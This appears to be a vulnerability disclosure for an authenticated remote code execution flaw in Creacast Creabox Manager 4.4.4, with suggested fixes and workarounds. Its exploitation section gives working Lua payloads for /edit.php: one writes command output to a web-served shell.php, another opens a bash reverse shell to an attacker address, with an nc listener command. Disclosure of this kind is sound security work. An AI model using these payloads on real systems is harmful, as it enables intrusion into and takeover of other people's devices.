# Creacast Creabox Manager - Remote Code Execution (RCE)

## Description
Creacast Creabox Manager contains a critical Remote Code Execution vulnerability accessible via the `edit.php` endpoint. An authenticated attacker can inject arbitrary Lua code into the configuration, which is then executed on the server. This allows full system compromise, including reverse shell execution or arbitrary command execution.

---

## Vendor Information

- **Vendor**: CREACAST  
- **Vendor Homepage**: http://www.creacast.com/

## Product
- **Name**: Creacast Creabox Manager
- **Firmware Version**: 4.4.4

## Vulnerability Type
- Remote Code Execution (Authenticated)

## Attack Vector
- Network (Web Interface)


---


## Vulnerable Endpoint
- `/edit.php` *(Requires authentication)*

---

## Exploitation

### Prerequisites
- Attacker must be logged in (e.g., via prior [Authentication Bypass](#) or using stolen credentials)

### Proof of Concept (Command Execution)
1. Navigate to: `http://<target-ip>/edit.php`
2. Inject the following Lua code into the config:
   ```lua
   os.execute("id >> /home/www/shell.php")
   ```
3. Visit ```http://<target-ip>/shell.php``` to view command output

### Reverse Shell

- Inject this Lua payload to get a reverse shell:
```lua
os.execute("bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'")
```
* Set up a listener on the attacker machine:
```bash
nc -lvnp 4444
```
---

## Proof of Concept (PoC) for(RCE,Information Disclosure,Authentication Bypass)
https://github.com/user-attachments/assets/de63e189-2137-4521-8a32-8dc9502ae13a

---

## Impact

   * Full root access to the underlying system

   *  Remote takeover of streaming infrastructure

   *  Lateral movement within the network

---

## Suggested Fixes

   *  Sanitize and validate Lua code inputs in /edit.php

   *  Restrict or disable os.execute calls within the Lua environment

   *  Implement strict role-based access controls

   *  Log and alert on suspicious configuration changes

---

## Workarounds

   *  Restrict access to /edit.php via IP whitelisting or VPN

   *  Regularly review and audit configuration files

   *  Monitor system logs for execution of unexpected shell commands

---
